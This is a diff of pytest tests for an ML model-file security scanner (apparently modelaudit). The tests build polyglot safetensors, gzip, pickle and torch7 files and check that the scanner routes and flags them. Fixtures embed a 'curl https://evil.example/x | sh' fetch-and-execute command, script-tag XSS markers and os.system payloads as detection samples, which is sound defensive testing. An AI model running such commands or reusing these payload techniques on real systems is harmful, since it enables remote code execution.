+        header_length = struct.unpack("<Q", handle.read(8))[0]
+        assert handle.read(1) == b"{"
+    assert header_length > SAFETENSORS_ROUTING_HEADER_PARSE_BYTES
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+def test_scan_file_routes_valid_gzip_safetensors_polyglot_to_compressed(tmp_path: Path) -> None:
+    polyglot = tmp_path / "gzip-safetensors-polyglot.py.gz"
+    _write_gzip_safetensors_polyglot(polyglot)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "compressed"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "gzip"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "gzip"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "compressed"
+    assert "safetensors" in result.metadata["supplemental_scanners"]
+    assert any(check.name == "SafeTensors XSS/HTML Injection Detection" for check in result.checks)
+    assert any(
+        check.name == "Python Archive Member Security"
+        and check.status == CheckStatus.FAILED
+        and "os.system" in check.message
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "trailing_data",
+    [b"benign trailing safetensors bytes", b"\x1f\x8bBAD gzip-like trailing bytes"],
+    ids=["ordinary", "invalid-gzip-prefix"],
+)
+def test_scan_file_keeps_gzip_prefix_with_trailing_safetensors_data_clean(
+    tmp_path: Path,
+    trailing_data: bytes,
+) -> None:
+    polyglot = tmp_path / "gzip-prefix-safetensors.unknown"
+    _write_gzip_safetensors_polyglot(
+        polyglot,
+        include_xss=False,
+        include_python_payload=False,
+        trailing_data=trailing_data,
+    )
+
+    assert file_detection.detect_file_format(str(polyglot)) == "safetensors"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "safetensors"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "safetensors"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert result.success is True
+    assert not result.issues
+
+
+def test_scan_file_detects_python_in_gzip_safetensors_with_nonmember_trailing_data(tmp_path: Path) -> None:
+    polyglot = tmp_path / "gzip-python-trailing-safetensors.unknown"
+    _write_gzip_safetensors_polyglot(
+        polyglot,
+        include_xss=False,
+        trailing_data=b"benign trailing safetensors bytes",
+    )
+
+    assert file_detection.detect_file_format(str(polyglot)) == "safetensors"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "safetensors"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "safetensors"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert "compressed" in result.metadata["supplemental_scanners"]
+    assert any(
+        check.name == "Python Archive Member Security"
+        and check.status == CheckStatus.FAILED
+        and "os.system" in check.message
+        for check in result.checks
+    )
+
+    aggregate = scan_model_directory_or_file(str(polyglot), cache_enabled=False)
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_scan_file_keeps_zero_prefixed_nonmember_gzip_trailing_data_clean(tmp_path: Path) -> None:
+    polyglot = tmp_path / "gzip-zero-prefix-safetensors.unknown"
+    _write_gzip_safetensors_polyglot(
+        polyglot,
+        include_xss=False,
+        include_python_payload=False,
+        trailing_data=(b"\x00" * 4096) + b"benign trailing safetensors bytes",
+    )
+
+    assert file_detection.detect_file_format(str(polyglot)) == "safetensors"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "safetensors"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "safetensors"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert result.success is True
+    assert not result.issues
+
+
+def test_scan_file_keeps_gzip_zero_padding_security_overlap_compressed(tmp_path: Path) -> None:
+    polyglot = tmp_path / "gzip-padding-safetensors.py.gz"
+    _write_gzip_safetensors_polyglot(
+        polyglot,
+        include_xss=False,
+        trailing_data=b"\x00" * 32,
+    )
+
+    assert gzip.decompress(polyglot.read_bytes())
+    assert file_detection.detect_file_format(str(polyglot)) == "compressed"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "gzip"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "gzip"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "compressed"
+    assert any(
+        check.name == "Compressed Wrapper Stream Decode"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("scan_outcome_reason") == "compressed_stream_decode_failed"
+        for check in result.checks
+    )
+    assert result.success is False
+
+
+def test_scan_file_keeps_late_crc_failure_gzip_safetensors_polyglot_compressed(tmp_path: Path) -> None:
+    polyglot = tmp_path / "crc-failure.py.gz"
+    _write_gzip_safetensors_polyglot(polyglot)
+    payload = bytearray(polyglot.read_bytes())
+    payload[-8] ^= 0x01
+    polyglot.write_bytes(payload)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "compressed"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "gzip"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "gzip"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "compressed"
+    assert result.success is False
+
+
+def test_scan_file_merges_torch7_and_safetensors_overlap_findings(tmp_path: Path) -> None:
+    header_length = 0x3754
+    metadata = json.dumps(
+        {
+            "__metadata__": {
+                "note": (
+                    "torch.FloatTensor nn.Sequential cmd = os.execute('curl https://evil.example/x | sh') "
+                    "<script>alert(1)</script>"
+                )
+            },
+            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
+        },
+        separators=(",", ":"),
+    ).encode()
+    polyglot = tmp_path / "torch7-safetensors.unknown"
+    polyglot.write_bytes(
+        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + b"\x00"
+    )
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert result.metadata["supplemental_scanners"] == ["torch7"]
+    assert any(check.name == "SafeTensors XSS/HTML Injection Detection" for check in result.checks)
+    assert any(
+        check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+    assert result.success is False
+
+
+def test_nested_scan_merges_safetensors_findings_for_gzip_overlap(tmp_path: Path) -> None:
+    polyglot = tmp_path / "nested-gzip-safetensors.unknown"
+    _write_gzip_safetensors_polyglot(polyglot)
+
+    result = archive_dispatch.scan_nested_file(
+        str(polyglot),
+        config={"cache_enabled": False, "_archive_depth": 1},
+    )
+
+    assert result.scanner_name == "compressed"
+    assert "safetensors" in result.metadata["supplemental_scanners"]
+    assert any(check.name == "SafeTensors XSS/HTML Injection Detection" for check in result.checks)
+    assert result.success is False
+
+
+def test_outer_safetensors_analysis_not_suppressed_by_child_metadata(tmp_path: Path) -> None:
+    child = tmp_path / "child.unknown"
+    _write_safetensors_pickle_tail(
+        child,
+        0x0156,
+        b"\n0cbuiltins\nset\n.",
+    )
+    child_member = gzip.compress(child.read_bytes(), mtime=0)
+    outer = tmp_path / "outer.gz"
+    _write_gzip_safetensors_polyglot(
+        outer,
+        include_python_payload=False,
+        trailing_data=child_member,
+    )
+
+    assert file_detection.detect_file_format(str(child)) == "pickle"
+    assert file_detection.has_safetensors_routing_candidate(str(outer))
+    assert file_detection.detect_file_format(str(outer)) == "compressed"
+
+    result = scan_file(str(outer), config={"cache_enabled": False})
+
+    assert result.scanner_name == "compressed"
+    assert any(
+        check.name == "SafeTensors XSS/HTML Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+    assert result.success is False
+
+    aggregate = scan_model_directory_or_file(str(outer), cache_enabled=False)
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_nested_scan_merges_torch7_and_safetensors_overlap_findings(tmp_path: Path) -> None:
+    header_length = 0x3754
+    metadata = json.dumps(
+        {
+            "__metadata__": {
+                "note": (
+                    "torch.FloatTensor nn.Sequential cmd = os.execute('curl https://evil.example/x | sh') "
+                    "<script>alert(1)</script>"
+                )
+            },
+            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
+        },
+        separators=(",", ":"),
+    ).encode()
+    polyglot = tmp_path / "nested-torch7-safetensors.unknown"
+    polyglot.write_bytes(
+        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + b"\x00"
+    )
+
+    result = archive_dispatch.scan_nested_file(
+        str(polyglot),
+        config={"cache_enabled": False, "_archive_depth": 1},
+    )
+
+    assert result.scanner_name == "safetensors"
+    assert result.metadata["supplemental_scanners"] == ["torch7"]
+    assert any(check.name == "SafeTensors XSS/HTML Injection Detection" for check in result.checks)
+    assert any(
+        check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+    assert result.success is False
+
+
+def test_scan_file_merges_safetensors_findings_after_zip_preflight_rejection(tmp_path: Path) -> None:
+    archive_buffer = io.BytesIO()
+    with zipfile.ZipFile(archive_buffer, "w") as archive:
+        archive.writestr("first.txt", b"one")
+        archive.writestr("second.txt", b"two")
+    tensor_data = archive_buffer.getvalue()
+    header_length = 512
+    metadata = json.dumps(
+        {
+            "__metadata__": {"note": "<script>alert(1)</script>"},
+            "tensor": {
+                "dtype": "U8",
+                "shape": [len(tensor_data)],
+                "data_offsets": [0, len(tensor_data)],
+            },
+        },
+        separators=(",", ":"),
+    ).encode()
+    polyglot = tmp_path / "zip-preflight-safetensors.unknown"
+    polyglot.write_bytes(
+        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + tensor_data
+    )
+
+    result = scan_file(
+        str(polyglot),
+        config={"cache_enabled": False, "max_zip_entries": 1},
+    )
+
+    assert result.scanner_name == "zip"
+    assert "safetensors" in result.metadata["supplemental_scanners"]
+    assert any(issue.rule_code == "S410" for issue in result.issues)
+    assert any(check.name == "SafeTensors XSS/HTML Injection Detection" for check in result.checks)
+    assert "_zip_container_dispatched_paths" not in result.to_dict()["metadata"]
+    assert result.success is False
+
+
 def test_scan_file_routes_protocolless_binary_pickle_with_misleading_extension(tmp_path: Path) -> None:
     disguised_pickle = tmp_path / "payload.jpg"
     disguised_pickle.write_bytes(_build_protocolless_binary_malicious_pickle())
@@ -5908,6 +6977,29 @@ def test_scan_file_prefers_hdf5_and_preserves_safetensors_userblock_analysis(
     )
 
 
+def test_nested_scan_prefers_hdf5_and_preserves_safetensors_userblock_analysis(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    polyglot = tmp_path / "nested-safetensors-userblock.safetensors"
+    _write_safetensors_hdf5_userblock_candidate(polyglot, plausible=True)
+    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)
+
+    result = archive_dispatch.scan_nested_file(
+        str(polyglot),
+        config={"cache_scan_results": False, "_archive_depth": 1},
+    )
+
+    assert result.scanner_name == "keras_h5"
+    assert result.success is False
+    assert "keras_h5_h5py_unavailable" in result.metadata["scan_outcome_reasons"]
+    assert result.metadata["supplemental_scanners"] == ["safetensors"]
+    assert any(check.name == "H5PY Library Check" for check in result.checks)
+    assert any(
+        check.name == "Header Length Validation" and check.status == CheckStatus.PASSED for check in result.checks
+    )
+
+
 def test_scan_file_keeps_malformed_hdf5_safetensors_near_match_on_safetensors_route(tmp_path: Path) -> None:
     near_match = tmp_path / "safetensors-near-match.safetensors"
     _write_safetensors_hdf5_userblock_candidate(near_match, plausible=False)
@@ -8001,18 +9093,12 @@ def test_scan_top_level_oversized_renamed_safetensors_fails_before_hashing(
     assert any(check.name == "Header Size Limit" for check in result.checks)
 
 
-@pytest.mark.parametrize(
-    ("filename", "header_prefix"),
-    [("overlap.jpg", b"{}"), ("overlap.safetensors", b"x")],
-)
 def test_tensorflow_inconclusive_safetensors_overlap_fails_closed_without_hashing(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
-    filename: str,
-    header_prefix: bytes,
 ) -> None:
-    payload = tmp_path / filename
-    _write_tensorflow_overlap_safetensors_candidate(payload, header_prefix)
+    payload = tmp_path / "overlap.safetensors"
+    _write_tensorflow_overlap_safetensors_candidate(payload, b"x")
     cache_dir = tmp_path / "cache"
     config = {
         "cache_enabled": True,
@@ -8057,6 +9143,26 @@ def test_tensorflow_inconclusive_safetensors_overlap_fails_closed_without_hashin
         assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
     finally:
         reset_cache_manager()
+
+
+def test_valid_safetensors_framing_precedes_ambiguous_tensorflow_probe(tmp_path: Path) -> None:
+    payload = tmp_path / "tensorflow-prefix-safetensors.unknown"
+    header_length = int.from_bytes(bytes([0x08, 0x01, 0x79, 0, 0, 0, 0, 0]), "little")
+    metadata = json.dumps(
+        {"t": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
+        separators=(",", ":"),
+    ).encode()
+    payload.write_bytes(struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + b"X")
+
+    assert file_detection.detect_file_format(str(payload)) == "safetensors"
+    assert file_detection.detect_file_format_from_magic(str(payload)) == "safetensors"
+    assert file_detection.detect_file_format_for_skip_filter(str(payload)) == "safetensors"
+
+    result = scan_file(str(payload), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert result.success is True
+    assert not result.issues
 
 
 def test_scan_file_routes_misnamed_gguf_by_header(tmp_path: Path) -> None:
